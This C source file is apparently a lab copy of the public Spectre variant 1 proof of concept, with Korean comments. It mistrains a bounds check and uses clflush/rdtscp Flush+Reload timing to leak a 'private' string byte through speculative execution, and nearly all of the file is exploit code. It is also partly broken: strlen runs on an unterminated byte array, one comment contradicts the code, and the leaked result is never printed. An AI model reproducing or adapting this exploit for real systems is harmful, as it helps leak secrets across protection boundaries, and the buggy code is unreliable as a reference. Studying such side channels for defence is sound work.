#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
//#include "local_content.h"

static volatile int public_data_size;


uint8_t public_data[16] = { // -> .data 영역
  1,  2,  3,  4,
  5,  6,  7,  8,
  9, 10, 11, 12,
  13, 14, 15, 16
};


//const char *public_data = "1234567890123456"; // ->  .rodata 영역
const char *private_data = "The Magic";
uint8_t probe[256 * 512];


__attribute__((always_inline))
static inline void ForceRead(const void *p) { 
  (void)*(volatile const unsigned char *)p; 
}

void victim_function(size_t idx) {
  if (idx < public_data_size) {
    ForceRead(&probe[public_data[idx] *512]);
  }
    
}

void readMemoryByte(const char* data,int cache_hit_threshold, size_t malicious_x) {
  
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  

  for (tries = 999; tries > 0; tries--) {

    
    for (i = 0; i < 256; i++)
      _mm_clflush(&probe[i * 512]); 
    
    
    training_x = tries % public_data_size;

    for (j =100; j >= 0; j--) {
      _mm_clflush(&public_data_size);

      /* flush딜레이, lfence로도 가능 */
      for (volatile int z = 0; z < 100; z++) {}


      // x는 j가 6의 배수 일때만 malicious_x임
      x = ((j % 10) - 1) & ~0xFFFF; 
      x = (x | (x >> 16));         
      x = training_x ^ (x & (malicious_x ^ training_x));

      victim_function(x);
    }

  
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &probe[mix_i * 512];
      time1 = __rdtscp(&junk);
      junk = *addr;
      time2 = __rdtscp(&junk) - time1;

      if ((int)time2 <= cache_hit_threshold && mix_i != public_data
    [tries % public_data_size])
        results[mix_i]++; 
    }
  }

  uint64_t min = 0;
  int answer = 0;

  for (int i = 0; i < 256; i++) {
    if (results[i] > min) {
      min = results[i];
      answer = i;
    }
  }

  //printf("char  = %d,and  %c a\n", results[answer], answer);
}

int main(void) {
  public_data_size = strlen(public_data);
  size_t malicious_x = (size_t)(private_data- (char *)public_data);
  int cache_hit_threshold = 80;
  int i;
  

  for (i = 0; i < (int)sizeof(probe); i++) {
    probe[i] = 1; /* write to probe so in RAM not copy-on-write zero pages */
  }
  int p = 10;

  //printf("a");

  printf("a"); 

  //printf(&p);

  // =.rodata section
  
  
  //volatile uint8_t temp;                       
  //temp ^= *(volatile uint8_t *)private_data;   //private data는 캐싱이 되어있어야 함.(speculation window안에서 접근하도록)
  
  readMemoryByte(public_data,cache_hit_threshold, malicious_x++);

  return 0;
}
